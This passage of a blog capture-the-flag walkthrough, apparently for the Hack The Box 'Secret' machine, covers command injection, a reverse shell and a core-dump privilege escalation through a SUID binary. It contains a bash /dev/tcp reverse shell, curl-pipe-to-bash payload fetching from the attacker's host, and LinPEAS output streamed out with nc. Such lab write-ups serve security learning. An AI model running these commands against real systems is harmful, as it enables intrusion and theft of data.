+<p><em><strong>Note:</strong> URL encoding is mandatory to perform complex input with special characters (spaces, dashes, etc.).</em></p>
+<pre tabindex="0"><code>Prints CURL&#39;s version
+file=-;curl --version
+</code></pre><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_13-19.png"></p>
+<p>After guaranteeing that our code is fully functional, let us connect to the remote machine via a simple reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Create a reverse shell script and save it under ./www/rs.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.9/9001 0&gt;&amp;<span style="color:#f60">1</span> <span style="color:#0f0"># 10.10.14.9 is my current HTB ip</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hosting the ./www directory, locally</span>
+</span></span><span style="display:flex;"><span>$ cd ./www
+</span></span><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#f60">8088</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Simultaneously, start our listener on port 9001 in another session</span>
+</span></span><span style="display:flex;"><span>$ rlwrap -cAr nc -lvnp <span style="color:#f60">9001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Send the RCE payload to the server</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># -;curl http://10.10.14.9:8088/rs.sh | bash</span>
+</span></span></code></pre></div><p>And we get ourselves a shell on the server, navigate to <code>$HOME</code> and read the user&rsquo;s flag.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_14-41.png"></p>
+<h3 id="stage-3-privilege-escalation"><a class="h-anchor" href="#stage-3-privilege-escalation">Stage 3: Privilege Escalation</a></h3>
+<p>In this final stage, I would want to use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, one of my favorite enumeration tools, to aid us in gaining a better understanding of the target system. You can either inspect the output on-the-fly or stream it back to your machine for a more convenient examination.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># On victim&#39;s machine</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># This line will run LinPEAS in memory and stream the output to us.</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Remember to change the IP according to yours.</span>
+</span></span><span style="display:flex;"><span>$ curl http://10.10.14.9:8088/linpeas.sh | bash | nc 10.10.14.9 <span style="color:#f60">9002</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># On our end</span>
+</span></span><span style="display:flex;"><span>$ nc -lvnp <span style="color:#f60">9002</span> | tee linpeas.output
+</span></span><span style="display:flex;"><span>$ cat linpeas.output
+</span></span></code></pre></div><p>A lot of noises notwithstanding, LinPEAS does find <code>/opt/count</code>, an intriguing binary with SUID bit</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-09_10-26.png"></p>
+<p>and its provided source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5"># /opt/code.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;dirent.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/prctl.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/types.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/stat.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;linux/limits.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">dircount</span>(<span style="color:#f00">const</span> <span style="color:#ee82ee">char</span> *path, <span style="color:#ee82ee">char</span> *summary)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    DIR *dir;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> fullpath[PATH_MAX];
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">struct</span> dirent *ent;
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">struct</span> stat fstat;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> tot = <span style="color:#f60">0</span>, regular_files = <span style="color:#f60">0</span>, directories = <span style="color:#f60">0</span>, symlinks = <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span>((dir = <span style="color:#ff0">opendir</span>(path)) == NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Unable to open directory.</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">while</span> ((ent = <span style="color:#ff0">readdir</span>(dir)) != NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        ++tot;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">strncpy</span>(fullpath, path, PATH_MAX-NAME_MAX-<span style="color:#f60">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">strcat</span>(fullpath, <span style="color:#87ceeb">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">strncat</span>(fullpath, ent-&gt;d_name, <span style="color:#ff0">strlen</span>(ent-&gt;d_name));
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> (!<span style="color:#ff0">lstat</span>(fullpath, &amp;fstat))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span>(<span style="color:#ff0">S_ISDIR</span>(fstat.st_mode))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;d&#34;</span>);
+</span></span><span style="display:flex;"><span>                ++directories;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">else</span> <span style="color:#f00">if</span>(<span style="color:#ff0">S_ISLNK</span>(fstat.st_mode))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;l&#34;</span>);
+</span></span><span style="display:flex;"><span>                ++symlinks;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">else</span> <span style="color:#f00">if</span>(<span style="color:#ff0">S_ISREG</span>(fstat.st_mode))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>                ++regular_files;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">else</span> <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;?&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IRUSR) ? <span style="color:#87ceeb">&#34;r&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IWUSR) ? <span style="color:#87ceeb">&#34;w&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IXUSR) ? <span style="color:#87ceeb">&#34;x&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IRGRP) ? <span style="color:#87ceeb">&#34;r&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IWGRP) ? <span style="color:#87ceeb">&#34;w&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IXGRP) ? <span style="color:#87ceeb">&#34;x&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IROTH) ? <span style="color:#87ceeb">&#34;r&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IWOTH) ? <span style="color:#87ceeb">&#34;w&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>((fstat.st_mode &amp; S_IXOTH) ? <span style="color:#87ceeb">&#34;x&#34;</span> : <span style="color:#87ceeb">&#34;-&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;??????????&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">printf</span> (<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\t</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, ent-&gt;d_name);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">closedir</span>(dir);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">snprintf</span>(summary, <span style="color:#f60">4096</span>, <span style="color:#87ceeb">&#34;Total entries       = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Regular files       = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Directories         = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Symbolic links      = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, tot, regular_files, directories, symlinks);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">%s&#34;</span>, summary);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">filecount</span>(<span style="color:#f00">const</span> <span style="color:#ee82ee">char</span> *path, <span style="color:#ee82ee">char</span> *summary)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FILE *file;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> ch;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> characters, words, lines;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    file = <span style="color:#ff0">fopen</span>(path, <span style="color:#87ceeb">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (file == NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Unable to open file.</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Please check if file exists and you have read privilege.</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    characters = words = lines = <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">while</span> ((ch = <span style="color:#ff0">fgetc</span>(file)) != EOF)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        characters++;
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> (ch == <span style="color:#87ceeb">&#39;\n&#39;</span> || ch == <span style="color:#87ceeb">&#39;\0&#39;</span>)
+</span></span><span style="display:flex;"><span>            lines++;
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> (ch == <span style="color:#87ceeb">&#39; &#39;</span> || ch == <span style="color:#87ceeb">&#39;\t&#39;</span> || ch == <span style="color:#87ceeb">&#39;\n&#39;</span> || ch == <span style="color:#87ceeb">&#39;\0&#39;</span>)
+</span></span><span style="display:flex;"><span>            words++;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (characters &gt; <span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        words++;
+</span></span><span style="display:flex;"><span>        lines++;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">snprintf</span>(summary, <span style="color:#f60">256</span>, <span style="color:#87ceeb">&#34;Total characters = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Total words      = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">Total lines      = %d</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, characters, words, lines);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">%s&#34;</span>, summary);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> path[<span style="color:#f60">100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> res;
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">struct</span> stat path_s;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> summary[<span style="color:#f60">4096</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Enter source file/directory name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">scanf</span>(<span style="color:#87ceeb">&#34;%99s&#34;</span>, path);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">getchar</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">stat</span>(path, &amp;path_s);
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span>(<span style="color:#ff0">S_ISDIR</span>(path_s.st_mode))
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">dircount</span>(path, summary);
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">filecount</span>(path, summary);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// drop privs to limit file write
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">setuid</span>(<span style="color:#ff0">getuid</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// Enable coredump generation
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">prctl</span>(PR_SET_DUMPABLE, <span style="color:#f60">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Save results a file? [y/N]: &#34;</span>);
+</span></span><span style="display:flex;"><span>    res = <span style="color:#ff0">getchar</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (res == <span style="color:#f60">121</span> || res == <span style="color:#f60">89</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Path: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">scanf</span>(<span style="color:#87ceeb">&#34;%99s&#34;</span>, path);
+</span></span><span style="display:flex;"><span>        FILE *fp = <span style="color:#ff0">fopen</span>(path, <span style="color:#87ceeb">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> (fp != NULL) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">fputs</span>(summary, fp);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>        } <span style="color:#f00">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Could not open %s for writing</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, path);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="code-breakdown"><a class="h-anchor" href="#code-breakdown">Code breakdown</a></h4>
+<p>The source consists of three functions:</p>
+<ul>
+<li><code>dircount</code> counts the number of total directories within a given path. The function, however, is not exploitable as of its proper implementation.</li>
+<li><code>filecount</code> procedure reads and counts every single characters of a given file.</li>
+<li><code>main</code> reads input from STDIN and calls <code>dircount</code> whether the path is a directory; otherwise, invokes <code>filecount</code>. The function then prompts us to save the result as a file and exits.</li>
+</ul>
+<p>Even though the write feature sounds promising, the program&rsquo;s SUID is removed before we can do anything. Luckily, the author did give us a hint with the line <code>prctl(PR_SET_DUMPABLE, 1)</code> as the <code>PR_SET_DRUMPABLE</code> attribute normally takes <code>1</code> by default; however, it is reset to the current value in <code>/proc/sys/fs/suid_dumpable</code> whenever there is a change in the process&rsquo;s ownership or, particularly in this practice, its UID/GID. There are also other details and yet, we have the function fully covered <a href="https://man7.org/linux/man-pages/man2/prctl.2.html">here</a>.</p>
+<h4 id="solution"><a class="h-anchor" href="#solution">Solution</a></h4>
+<p>Based on what we have discussed above, <code>filecount</code> has prior access to <code>/root/</code> and is able to read the content therein before <code>setuid</code> revokes our permission. Thus, the program technically has to be <em>stopped</em> or crashed, thereby dumping the <code>/root/root.txt</code> context to, in this case, <code>/var/crashes</code> and we can extract the dump using <code>apport-unpack</code>. I get the idea from <a href="https://askubuntu.com/a/186285">this answer</a> on AskUbuntu after literally hours of finding escalation methods with <code>prctl</code> which are only CVEs and unintended solutions although I do gain root access using them.</p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
